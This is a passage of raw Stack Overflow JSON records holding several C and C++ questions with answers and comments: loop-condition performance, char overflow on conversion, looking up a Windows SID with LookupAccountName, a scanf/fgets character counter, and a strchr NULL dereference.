{"reputation": 23, "user_id": 5119599, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56018d219cd484c9863965ebc02606aa?s=128&d=identicon&r=PG&f=1", "display_name": "user5119599", "link": "https://stackoverflow.com/users/5119599/user5119599"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1483102782, "creation_date": 1482937353, "last_edit_date": 1482942047, "question_id": 41364602, "link": "https://stackoverflow.com/questions/41364602/why-does-c-program-run-slower-when-a-loop-contains-a-condition", "title": "Why does C program run Slower when a loop contains a condition", "body": "<p>I am rephrasing this question based on the comments received.</p>\n\n<p>I have a loop that runs 30 Billion times and assigns values to a chunk of memory assigned using malloc();</p>\n\n<p>When the loop contains a condition it runs much slower than when the condition is not present. Review the scenarios below:</p>\n\n<p>Scenario A: Condition is present and program is slow (43 sec)</p>\n\n<p>Scenario B: Condition is not present and program is much faster (4 sec)</p>\n\n<pre><code>// gcc -O3 -c block.c &amp;&amp; gcc -o block block.o\n\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n\n#define LEN 3000000000\n\nint main (int argc, char** argv){\n\n    long i,j;\n\n    unsigned char *n = NULL;\n    unsigned char *m = NULL;\n\n    m = (unsigned char *) malloc (sizeof(char) * LEN);\n\n    n = m;\n\n    srand ((unsigned) time(NULL));  \n\n    int t = (unsigned) time(NULL);\n\n    for (j = 0; j &lt; 10; j++){\n\n        n = m;\n\n        for (i = 0; i &lt; LEN; i++){\n\n\n            //////////// A: THIS IS SLOW\n            /*\n            if (i % 2){\n                *n = 1;         \n\n            } else {\n                *n = 0;\n            }   \n            */\n            /////////// END OF A\n\n\n            /////////// B: THIS IS FAST\n\n            *n = 0;\n\n            i % 2;\n\n            *n = 1;\n\n            /////////// END OF B\n\n            n += 1;\n\n        }\n    }\n\n\n    printf(\"Done. %d sec \\n\", ((unsigned) time(NULL)) - t );\n\n    free(m);\n\n    return 0;\n}\n</code></pre>\n\n<p>Regards,\nKD</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 11458, "user_id": 3435400, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/61726fe80facc93d76754f0226b49eb9?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3435400/alain"}, "edited": false, "score": 1, "creation_date": 1482937832, "post_id": 41364552, "comment_id": 69930835, "body": "Turn on compiler warnings, they would tell you what&#39;s wrong."}, {"owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "edited": false, "score": 2, "creation_date": 1482937929, "post_id": 41364552, "comment_id": 69930896, "body": "@PSkocik Lossy conversion is not undefined behavior. Only non-conversion signed overflow is. See <a href=\"http://stackoverflow.com/a/28453985/3425536\">this answer</a>."}, {"owner": {"reputation": 11458, "user_id": 3435400, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/61726fe80facc93d76754f0226b49eb9?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3435400/alain"}, "edited": false, "score": 1, "creation_date": 1482938266, "post_id": 41364552, "comment_id": 69931078, "body": "Lossy conversion for signed types: &quot;either the result is implementation-defined or an implementation-defined signal is raised.&quot;"}], "answers": [{"comments": [{"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1482943779, "post_id": 41364603, "comment_id": 69934088, "body": "Good answer. The maximum value for char cannot be determined from the code OP posted though."}, {"owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1482943927, "post_id": 41364603, "comment_id": 69934154, "body": "@2501 True. Fixed."}], "tags": [], "owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "is_accepted": true, "score": 5, "last_activity_date": 1482943845, "last_edit_date": 1482943845, "creation_date": 1482937355, "answer_id": 41364603, "question_id": 41364552, "link": "https://stackoverflow.com/questions/41364552/overflow-char-to-int-conversion/41364603#41364603", "title": "Overflow char to int conversion", "body": "<p><code>256</code> is too large for the <code>char</code> type on your machine.</p>\n\n<p>So it wraps around to the minimum value <code>0</code>, as per the C standard (from N1570, emphasis mine):</p>\n\n<blockquote>\n  <h3>6.3.1.3 Signed and unsigned integers</h3>\n  \n  <p>1 When a value with integer type is converted to another integer type other than <code>_Bool</code>, if the value\n  can be represented by the new type, it is unchanged.</p>\n  \n  <p>2 Otherwise, if\n  the new type is unsigned, <strong>the value is converted by repeatedly adding\n  or subtracting one more than the maximum value that can be represented\n  in the new type until the value is in the range of the new type.</strong><sup>60)</sup></p>\n  \n  <p>3\n  Otherwise, the new type is signed and the value cannot be represented\n  in it; either <strong>the result is implementation-defined</strong> or an\n  implementation-defined signal is raised.</p>\n</blockquote>\n\n<p>The <code>256</code> literal is an <code>int</code>, and <code>char</code> is an integer type that is either signed or unsigned, so one of the above emphasized behaviors will occur.</p>\n"}, {"comments": [{"owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "edited": false, "score": 0, "creation_date": 1482937618, "post_id": 41364610, "comment_id": 69930707, "body": "That&#39;s actually 256 characters in total."}], "tags": [], "owner": {"reputation": 456, "user_id": 7311969, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/hIOk2.png?s=128&g=1", "display_name": "Angelica", "link": "https://stackoverflow.com/users/7311969/angelica"}, "is_accepted": false, "score": 0, "last_activity_date": 1482937648, "last_edit_date": 1482937648, "creation_date": 1482937368, "answer_id": 41364610, "question_id": 41364552, "link": "https://stackoverflow.com/questions/41364552/overflow-char-to-int-conversion/41364610#41364610", "title": "Overflow char to int conversion", "body": "<p>Because Character set is limited to 255 characters only so your output is 0 </p>\n\n<p><a href=\"http://www.asciitable.com/\" rel=\"nofollow noreferrer\">http://www.asciitable.com/</a> have complete list of characterset details and char is limited to 256 only\nunsigned char   1 byte  -> 0 to 255\nsigned char     1 byte  -> -128 to 127</p>\n"}, {"comments": [{"owner": {"reputation": 27354, "user_id": 91282, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ae09a7b73edd93a4ec40a5c1b29e728?s=128&d=identicon&r=PG", "display_name": "Till", "link": "https://stackoverflow.com/users/91282/till"}, "edited": false, "score": 0, "creation_date": 1482937422, "post_id": 41364615, "comment_id": 69930593, "body": "bits not bytes."}, {"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "reply_to_user": {"reputation": 27354, "user_id": 91282, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5ae09a7b73edd93a4ec40a5c1b29e728?s=128&d=identicon&r=PG", "display_name": "Till", "link": "https://stackoverflow.com/users/91282/till"}, "edited": false, "score": 0, "creation_date": 1482937458, "post_id": 41364615, "comment_id": 69930612, "body": "@Till.: Trying to be fast... :D"}], "tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": false, "score": 0, "last_activity_date": 1482937798, "last_edit_date": 1482937798, "creation_date": 1482937396, "answer_id": 41364615, "question_id": 41364552, "link": "https://stackoverflow.com/questions/41364552/overflow-char-to-int-conversion/41364615#41364615", "title": "Overflow char to int conversion", "body": "<p>Trying to store 256 in 8 bits...it gets all the 1[00000000]. So basically it overflows and the 0 bits are only left.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nvoid func(int a);\n\nint main() {\n    char ch = 256;\n    printf(\"%c\\n\",ch); //nothing prints. That's what happens when\n                       // when we print 'NUL'\n    func(ch);\n    return 0;\n}\n\nvoid func(int a) {\n    printf(\"%d\\n\", a);\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2988, "user_id": 452414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/rDMfs.png?s=128&g=1", "display_name": "babon", "link": "https://stackoverflow.com/users/452414/babon"}, "edited": false, "score": 0, "creation_date": 1482938499, "post_id": 41364755, "comment_id": 69931228, "body": "You do understand that signed whole numbers are stored as 2&#39;s compliment right?"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1482940181, "post_id": 41364755, "comment_id": 69932144, "body": "<code>char</code> may be <code>signed</code> or <code>unsigned</code>; the value stored in <code>ch</code> is implementation-defined behavior if <code>ch</code> is a <code>signed</code> integer type."}], "tags": [], "owner": {"reputation": 293, "user_id": 7182347, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-i61AH4iaNcA/AAAAAAAAAAI/AAAAAAAAAFU/uf7R62glAtc/photo.jpg?sz=128", "display_name": "Sanjay Idpuganti", "link": "https://stackoverflow.com/users/7182347/sanjay-idpuganti"}, "is_accepted": false, "score": 0, "last_activity_date": 1482937854, "creation_date": 1482937854, "answer_id": 41364755, "question_id": 41364552, "link": "https://stackoverflow.com/questions/41364552/overflow-char-to-int-conversion/41364755#41364755", "title": "Overflow char to int conversion", "body": "<p>The maximum range of <code>char</code> is <code>127</code>. The value <code>256</code> is <code>129</code> more than <code>127</code> and when we add <code>1</code> to <code>127</code> (which is maximum value of char) it goes to minimum value <code>-128</code>. So if we add <code>129</code> to <code>127</code> it results in <code>0</code>.</p>\n\n<p>for char \n127 + 1 = -128.\n127 + 129 = 0</p>\n\n<p>So for the below program the output is 1.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid func(int a);\n\nint main() {\n    char ch = 257;\n    func(ch);\n    return 0;\n}\n\nvoid func(int a) {\n    printf(\"%d\\n\", a);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 18197, "user_id": 4183191, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/8ce0d78cc78f51ee79cec5088effe3ed?s=128&d=identicon&r=PG", "display_name": "Tasos Papastylianou", "link": "https://stackoverflow.com/users/4183191/tasos-papastylianou"}, "is_accepted": false, "score": 0, "last_activity_date": 1482937885, "creation_date": 1482937885, "answer_id": 41364772, "question_id": 41364552, "link": "https://stackoverflow.com/questions/41364552/overflow-char-to-int-conversion/41364772#41364772", "title": "Overflow char to int conversion", "body": "<p>If you compile this with gcc it actually tells you why:</p>\n\n<pre><code>testo.c: In function \u2018main\u2019:\ntesto.c:6:15: warning: overflow in implicit constant conversion [-Woverflow]\n     char ch = 256;\n               ^\n</code></pre>\n"}], "owner": {"reputation": 293, "user_id": 7182347, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-i61AH4iaNcA/AAAAAAAAAAI/AAAAAAAAAFU/uf7R62glAtc/photo.jpg?sz=128", "display_name": "Sanjay Idpuganti", "link": "https://stackoverflow.com/users/7182347/sanjay-idpuganti"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 255, "favorite_count": 0, "accepted_answer_id": 41364603, "answer_count": 5, "score": -3, "last_activity_date": 1482943845, "creation_date": 1482937163, "question_id": 41364552, "link": "https://stackoverflow.com/questions/41364552/overflow-char-to-int-conversion", "title": "Overflow char to int conversion", "body": "<pre><code>#include &lt;stdio.h&gt;\n\nvoid func(int a);\n\nint main() {\n    char ch = 256;\n    func(ch);\n    return 0;\n}\n\nvoid func(int a) {\n    printf(\"%d\\n\", a);\n}\n</code></pre>\n\n<p>The output of the above program is <code>0</code>.\nCan anyone explain how</p>\n"}, {"tags": ["c++", "c", "windows", "windows-security", "windows-users"], "comments": [{"owner": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "edited": false, "score": 2, "creation_date": 1482937270, "post_id": 41364503, "comment_id": 69930514, "body": "Have you tried <code>LookupAccountName()</code> <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa379159(v=vs.85).aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/windows/desktop/&hellip;</a>"}, {"owner": {"reputation": 9475, "user_id": 1204153, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/99f438bb3838ccd7079152fc50e784d1?s=128&d=identicon&r=PG", "display_name": "Andy", "link": "https://stackoverflow.com/users/1204153/andy"}, "reply_to_user": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "edited": false, "score": 0, "creation_date": 1482937359, "post_id": 41364503, "comment_id": 69930568, "body": "ha... looks like that&#39;s the &quot;magical API&quot; I was talking about. I&#39;ll go try it out. Thanks, buddy."}, {"owner": {"reputation": 9475, "user_id": 1204153, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/99f438bb3838ccd7079152fc50e784d1?s=128&d=identicon&r=PG", "display_name": "Andy", "link": "https://stackoverflow.com/users/1204153/andy"}, "reply_to_user": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "edited": false, "score": 0, "creation_date": 1482938391, "post_id": 41364503, "comment_id": 69931147, "body": "@Frankie_C -- Yeah that works... Thanks. I was losing my mind. If you answer with that, I&#39;ll accept."}], "answers": [{"tags": [], "owner": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "is_accepted": true, "score": 1, "last_activity_date": 1482940461, "creation_date": 1482940461, "answer_id": 41365482, "question_id": 41364503, "link": "https://stackoverflow.com/questions/41364503/get-windows-user-account-sid-by-account-name-only/41365482#41365482", "title": "Get Windows user account SID by account name only", "body": "<p>You can use the buddy function <code>LookupAccountName()</code>.</p>\n\n<p>See <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa379159(v=vs.85).aspx\" rel=\"nofollow noreferrer\">https://msdn.microsoft.com/en-us/library/windows/desktop/aa379159(v=vs.85).aspx</a></p>\n"}], "owner": {"reputation": 9475, "user_id": 1204153, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/99f438bb3838ccd7079152fc50e784d1?s=128&d=identicon&r=PG", "display_name": "Andy", "link": "https://stackoverflow.com/users/1204153/andy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 704, "favorite_count": 0, "accepted_answer_id": 41365482, "answer_count": 1, "score": 1, "last_activity_date": 1482940461, "creation_date": 1482936998, "question_id": 41364503, "link": "https://stackoverflow.com/questions/41364503/get-windows-user-account-sid-by-account-name-only", "title": "Get Windows user account SID by account name only", "body": "<p>I am trying to programmatically delete a user profile (the right way) using the <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/bb762273(v=vs.85).aspx\" rel=\"nofollow noreferrer\">DeleteProfile()</a> API. Unfortunately, it wants an account SID as the first parameter.</p>\n\n<p>There has to be some magical API that takes a username and spits out an SID, correct? I can't seem to find anything online that is uses native code (I am not using .NET managed code and don't want to use WMI queries or powershell or cmdline tools, etc)</p>\n\n<p>I know you can use the Net32Api to delete an account, but that still leaves artifacts like profile directory, etc. I just want a way to cleanly delete a profile (obviously from elevated code).</p>\n\n<p>Thank you!</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1482936280, "post_id": 41364309, "comment_id": 69929917, "body": "Welcome to Stack Overflow. Please take the time to read <a href=\"http://stackoverflow.com/tour\">The Tour</a> and refer to the material from the <a href=\"http://stackoverflow.com/help/asking\">Help Center</a> what and how you can ask here."}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1482936333, "post_id": 41364309, "comment_id": 69929948, "body": "The right tool to solve such problems is your debugger. You should step through your code line-by-line <i>before</i> asking on Stack Overflow. For more help, please read <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">How to debug small programs (by Eric Lippert)</a>. At a minimum, you should &#91;edit] your question to include a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable</a> example that reproduces your problem, along with the observations you made in the debugger."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1482960141, "post_id": 41364309, "comment_id": 69941379, "body": "If any of the posted answers solve your problem, please remember to accept it. That help us all to know that no further action is needed"}], "answers": [{"comments": [{"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1482939012, "post_id": 41364725, "comment_id": 69931483, "body": "I was writing my own answer when this answer was posted. So now I don&#39;t see any reason to post mine as the principle was the same. But there are a few things I think should be added: 1) Initialize the whole <code>ara</code> array. Currently this code has UB. The extra time it takes to initialize everything doesn&#39;t matter in a program reading from stdin. 2) Check the value of <code>j</code>to be in range before using it for indexing into <code>ara</code>"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1482939402, "post_id": 41364725, "comment_id": 69931702, "body": "and 3) Check the value of <code>s[i]</code> before indexing into <code>ara</code>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1482941045, "post_id": 41364725, "comment_id": 69932634, "body": "@4386427 thank you, I only mentioned error checking at the end. The array could have had 256 elements, and with <code>unsigned char</code> input. There were some other things I could have mentioned but wanted to keep the answer close to the question, not make an exhaustive rewrite."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1482958226, "post_id": 41364725, "comment_id": 69940613, "body": "Agree - sometimes it is better to focus on the main problem and let minor issues pass. I just wanted to give OP a chance to pick up some additional feedback. +1 from here."}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": true, "score": 1, "last_activity_date": 1482937773, "creation_date": 1482937773, "answer_id": 41364725, "question_id": 41364309, "link": "https://stackoverflow.com/questions/41364309/geting-input-of-string-and-character-in-a-loop-on-c/41364725#41364725", "title": "geting input of string and character in a loop on c", "body": "<p>The problem is that <code>scanf</code> is leaving a <code>newline</code> in the input to be read as the target sentence.</p>\n\n<p>You can get around this by using <code>fgets</code> and <code>sscanf</code> instead. I also added some cues to make it easier to know what is expected.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main (void)\n{\n    int ara [128];                          // increased array size\n    char s[1000];\n    char t[10];\n    int l, j, i, len;\n    char c;\n\n    printf(\"Enter how many loops:\\n\");\n    fgets(t, sizeof t, stdin);              // replace scanf\n    sscanf (t, \"%d\\n\", &amp;l);                 // with sscanf\n\n    while (l &gt; 0){                          // changed end test\n\n        for (i = 'A'; i &lt;= 'z'; i++)        // replaced magic numbers\n        {\n            ara[i] = 0;\n        }\n\n        printf(\"Enter the string:\\n\");\n        fgets(s, sizeof s, stdin);\n        len = strlen(s);\n\n        for (i = 0;i &lt;= len; i++)\n        {\n            ara[s[i]]++;\n        }\n\n        printf(\"Enter the letter:\\n\");\n        fgets(t, sizeof t, stdin);          // replace scanf\n        sscanf (t, \"%c\\n\", &amp;c);             // with sscanf\n        j = c;\n        printf(\"count : %d\\n\", ara[j]);\n\n        l--;\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Program session</p>\n\n<pre>\nEnter how many loops:\n2\nEnter the string:\none two three four\nEnter the letter:\no\ncount : 3\nEnter the string:\nthree seven\nEnter the letter:\ne\ncount : 4\n</pre>\n\n<p>Note that ideally, you should also check the function return values from <code>fgets</code> and <code>sscanf</code>.</p>\n"}], "owner": {"reputation": 21, "user_id": 7350157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ea2a6ad8eca4f09b698c0d532d96578?s=128&d=identicon&r=PG&f=1", "display_name": "Rifath", "link": "https://stackoverflow.com/users/7350157/rifath"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1319, "favorite_count": 0, "accepted_answer_id": 41364725, "answer_count": 1, "score": -4, "last_activity_date": 1483031572, "creation_date": 1482936252, "last_edit_date": 1482936315, "question_id": 41364309, "link": "https://stackoverflow.com/questions/41364309/geting-input-of-string-and-character-in-a-loop-on-c", "title": "geting input of string and character in a loop on c", "body": "<p>Actually recently i found a problem where i need to count occurrence a given(by oj) char in a given string(with test case).So i write this code but output is not as i desired.I'm a beginner so i'll be greatly thankful for any kind of instructive advice or help.THANK YOU.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n\nint main ()\n{\n    int ara [123];\n    char s[1000];\n    int l, j, i, len;\n    char c;\n\n    scanf (\"%d\\n\", &amp;l);\n\n    while (l &gt;= 0){\n\n        for (i = 65; i &lt;= 122; i++)\n        {\n            ara[i] = 0;\n        }\n\n        fgets(s, 1000, stdin);\n        len = strlen(s);\n\n        for (i = 0;i &lt;= len; i++)\n        {\n            ara[s[i]]++;\n        }\n\n        scanf(\" %c\\n\", &amp;c);\n        j = c;\n        printf(\"count : %d\\n\", ara[j]);\n\n        l--;\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "segmentation-fault", "strchr"], "comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 3, "creation_date": 1482936077, "post_id": 41364207, "comment_id": 69929810, "body": "Does this happen with all input, or only with characters that do not appear in your test string?"}, {"owner": {"reputation": 53, "user_id": 6173472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6539f889a9c279a0a0fe012e8301f99?s=128&d=identicon&r=PG&f=1", "display_name": "ulissesBR", "link": "https://stackoverflow.com/users/6173472/ulissesbr"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1482936150, "post_id": 41364207, "comment_id": 69929844, "body": "@Rad Lexus with all input... Still trying to figure out what is happening..."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 2, "creation_date": 1482936192, "post_id": 41364207, "comment_id": 69929865, "body": "Show your input. Also <code>strchr</code> can search <code>&#39;\\0&#39;</code>."}, {"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "edited": false, "score": 0, "creation_date": 1482936260, "post_id": 41364207, "comment_id": 69929909, "body": "yes your code works fine for me"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 4, "creation_date": 1482936320, "post_id": 41364207, "comment_id": 69929944, "body": "Not with &quot;all input&quot;. Entering <code>e</code> works. But when not found, you don&#39;t test the return value before deferencing <code>NULL</code>."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1482936342, "post_id": 41364207, "comment_id": 69929954, "body": "I just tried. It <i>does</i> work, as long as you do not search for a character not in your string. If you do, you are attempting to print the contents of <code>NULL</code>."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1482936515, "post_id": 41364207, "comment_id": 69930052, "body": "@BLUEPIXY: interesting \u2013 it&#39;s even <a href=\"http://en.cppreference.com/w/c/string/byte/strchr\" rel=\"nofollow noreferrer\">mentioned</a>. Perhaps inverting the test is all that needed to add that functionality."}, {"owner": {"reputation": 53, "user_id": 6173472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6539f889a9c279a0a0fe012e8301f99?s=128&d=identicon&r=PG&f=1", "display_name": "ulissesBR", "link": "https://stackoverflow.com/users/6173472/ulissesbr"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": 